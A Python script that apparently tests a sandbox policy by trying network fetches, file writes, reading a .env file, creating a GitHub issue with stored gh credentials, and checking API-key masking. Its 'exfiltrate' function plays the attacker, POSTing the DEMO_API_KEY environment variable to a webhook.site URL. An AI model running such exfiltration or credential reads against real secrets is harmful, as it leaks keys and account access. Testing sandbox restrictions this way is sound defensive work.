#!/usr/bin/env python3
"""Exercises every restriction declared in sandbox-settings.json.

Each line either succeeds or is blocked exactly where the policy says.
"""
import os, pathlib, subprocess, sys, urllib.error, urllib.request

HERE = pathlib.Path(__file__).resolve().parent


def fetch(host):
    try:
        with urllib.request.urlopen(f"https://{host}", timeout=5) as r:
            return str(r.status)
    except urllib.error.HTTPError as e:  # the host answered, just not with 2xx
        return str(e.code)
    except Exception as e:
        return f"BLOCKED ({getattr(e, 'reason', e)})"


def exfiltrate(url):
    """Plays the attacker: POST the key to an allowed host that is NOT an injectHost."""
    data = f"DEMO_API_KEY={os.environ.get('DEMO_API_KEY')}".encode()
    view = f"https://webhook.site/#!/view/{url.rstrip('/').rsplit('/', 1)[-1]}"
    try:
        with urllib.request.urlopen(url, data=data, timeout=10) as r:
            return f"{r.status}, sent (only the placeholder can have left) - see it at {view}"
    except Exception as e:
        return f"FAILED ({getattr(e, 'reason', e)})"


def write(path):
    try:
        path.write_text("x")
    except OSError:
        return "BLOCKED"
    return "OK"


def read(path):
    try:
        path.read_text()
    except OSError:
        return "BLOCKED"
    return "LEAKED"


def gh_issue():
    """Tries to open a real issue on this repo; gh's login lives in ~/.config/gh and the Keychain."""
    try:
        r = subprocess.run(
            ["gh", "issue", "create", "--title", "sandbox demo: should never appear", "--body", "LEAKED"],
            cwd=HERE, capture_output=True, text=True, timeout=20, stdin=subprocess.DEVNULL,
            env={**os.environ, "GH_PROMPT_DISABLED": "1"})
    except subprocess.TimeoutExpired:
        return "BLOCKED (timed out)"
    if r.returncode == 0:
        return f"LEAKED (created {r.stdout.strip()})"
    return f"BLOCKED ({(r.stderr or r.stdout).strip().splitlines()[-1]})"


print("== NETWORK ==")
print(f"github.com  -> {fetch('github.com')}")
print(f"example.com -> {fetch('example.com')}")

print("== FILESYSTEM ==")
print(f"write /tmp/sandbox-demo -> {write(pathlib.Path('/tmp/sandbox-demo/ok.txt'))}")
print(f"write $HOME            -> {write(pathlib.Path.home() / 'should-fail.txt')}")
print(f"read ./.env             -> {read(HERE / '.env')}")
print(f"gh issue create         -> {gh_issue()}")

print("== KEY MASKING ==")
print(f"DEMO_API_KEY as seen here -> {os.environ.get('DEMO_API_KEY')}")
cli = subprocess.run([sys.executable, HERE / "remote-server-cli.py"], capture_output=True, text=True)
print(f"API call with it          -> {(cli.stdout or cli.stderr).strip()}")
webhook = HERE / "webhook-url.txt"
if webhook.exists():
    print(f"send it to webhook.site   -> {exfiltrate(webhook.read_text().strip())}")
